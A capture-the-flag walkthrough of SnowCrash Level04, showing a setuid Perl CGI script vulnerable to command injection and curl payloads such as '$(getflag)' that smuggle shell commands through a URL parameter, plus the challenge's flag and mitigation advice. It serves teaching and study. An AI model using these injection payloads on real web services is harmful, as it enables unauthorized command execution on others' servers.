# SnowCrash Level04 Walkthrough

## Overview
Level04 demonstrates a classic web application vulnerability: **command injection** through a Perl CGI script. This level shows how unsanitized user input can lead to arbitrary command execution on the server.

## Initial Investigation

Upon logging into the level04 user, we find a Perl script:

```bash
level04@SnowCrash:~$ ls -la
total 14
dr-xr-x---+ 1 level04 level04   120 Mar  5  2016 .
d--x--x--x  1 root    users     340 Aug 30  2015 ..
-r-x------  1 level04 level04   220 Apr  3  2012 .bash_logout
-r-x------  1 level04 level04  3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag04  level04   152 Mar  5  2016 level04.pl
-r-x------  1 level04 level04   675 Apr  3  2012 .profile
```

### Key Observations
- The `level04.pl` script has **setuid** and **setgid** bits set (`-rwsr-sr-x`)
- It's owned by `flag04` user, meaning it runs with flag04 privileges
- The file is a Perl script (`.pl` extension)

## Script Analysis

Let's examine the contents of the Perl script:

```bash
level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

### Code Breakdown

1. **Shebang**: `#!/usr/bin/perl` - Specifies this is a Perl script
2. **Comment**: `# localhost:4747` - Indicates the script runs on port 4747
3. **CGI Module**: `use CGI qw{param};` - Imports the CGI module for handling web parameters
4. **HTTP Header**: `print "Content-type: text/html\n\n";` - Outputs HTML content type
5. **Function Definition**: The `x` subroutine takes a parameter and executes it
6. **Vulnerable Code**: `print \`echo $y 2>&1\`;` - Executes shell commands with backticks
7. **Parameter Handling**: `x(param("x"));` - Passes URL parameter "x" to the function

### Vulnerability Analysis

The critical vulnerability lies in this line:
```perl
print `echo $y 2>&1`;
```

This code:
- Uses backticks to execute shell commands
- Directly interpolates user input (`$y`) into the command
- Provides no input sanitization or validation
- Runs with elevated privileges due to the setuid bit

## Confirming the Web Service

The script is designed to run as a web service on port 4747. We can verify this by checking if the service is running:

```bash
level04@SnowCrash:~$ netstat -tlnp | grep 4747
tcp        0      0 127.0.0.1:4747          0.0.0.0:*               LISTEN      -
```

The service is indeed listening on localhost port 4747.

## Exploitation Strategy

The attack vector involves:
1. **Command Injection**: Using command substitution syntax `$(command)` in the URL parameter
2. **Privilege Escalation**: Leveraging the setuid bit to execute commands as flag04
3. **Flag Retrieval**: Executing `getflag` with elevated privileges

### Step 1: Test Basic Command Injection

First, let's verify that command injection works by executing a simple `ls` command:

```bash
level04@SnowCrash:~$ curl 'http://localhost:4747?x=$(ls)'
level04.pl
```

**Success!** The server executed `ls` and returned the directory listing, confirming the command injection vulnerability.

### Step 2: Understanding the Injection Mechanism

The injection works because:
1. Our input `$(ls)` is passed as parameter `x`
2. The script assigns it to variable `$y`
3. The command becomes: `echo $(ls) 2>&1`
4. The shell interprets `$(ls)` as command substitution
5. `ls` executes first, then its output is passed to `echo`

### Step 3: Execute getflag

Now we can execute `getflag` to retrieve the flag:

```bash
level04@SnowCrash:~$ curl 'http://localhost:4747?x=$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

## Alternative Injection Methods

Several other command injection techniques would work:

<!-- ### Using Semicolon Separation
```bash
curl 'http://localhost:4747?x=;getflag'
``` -->

### Using Pipe Operators
```bash
curl 'http://localhost:4747?x=|getflag'
```

### Using Backticks
```bash
curl 'http://localhost:4747?x=`getflag`'
```

<!-- ### Using AND Operator
```bash
curl 'http://localhost:4747?x=&&getflag'
``` -->

## Security Implications

This level demonstrates several critical security vulnerabilities:

### 1. **Command Injection**
- Direct execution of user input without sanitization
- Use of dangerous functions like backticks in Perl
- No input validation or filtering

### 2. **Privilege Escalation**
- Setuid binary allowing execution with elevated privileges
- Web service running with unnecessary permissions

### 3. **Poor Input Handling**
- No escaping or sanitization of user input
- Direct interpolation of variables into shell commands

## Mitigation Strategies

To prevent such vulnerabilities:

1. **Input Sanitization**: Always validate and sanitize user input
2. **Avoid Shell Execution**: Use safer alternatives to `system()` or backticks
3. **Principle of Least Privilege**: Don't run web services with elevated permissions
4. **Parameter Validation**: Implement strict parameter validation
5. **Use Safe Functions**: Prefer functions that don't invoke shell interpreters

### Example of Secure Code
```perl
# Instead of: print `echo $y 2>&1`;
# Use: 
if ($y =~ /^[a-zA-Z0-9\s]+$/) {  # Validate input
    print CGI::escapeHTML($y);    # Escape output
}
```

## Web Application Context

This level simulates a common real-world scenario where:
- Web applications accept user input through URL parameters
- Backend scripts process this input without proper validation
- Elevated privileges amplify the impact of vulnerabilities

## Flag
```
ne2searoevaevoem4ov4ar8ap
```

This flag allows access to the next level of the SnowCrash challenge.

## Key Learnings

1. **Command Injection Basics**: Understanding how unsanitized input can lead to code execution
2. **CGI Security**: Common vulnerabilities in CGI scripts and web applications
3. **Privilege Escalation**: How setuid binaries can amplify security vulnerabilities
4. **Input Validation**: The critical importance of sanitizing user input
5. **Shell Metacharacters**: Understanding dangerous characters and command substitution syntax
6. **Web Security**: Basic principles of secure web application development

## Tools and Techniques Used

- **curl**: For making HTTP requests and testing web services
- **netstat**: For checking running services and open ports
- **Command Substitution**: Using `$(command)` syntax for injection
- **File Permissions Analysis**: Understanding setuid and setgid bits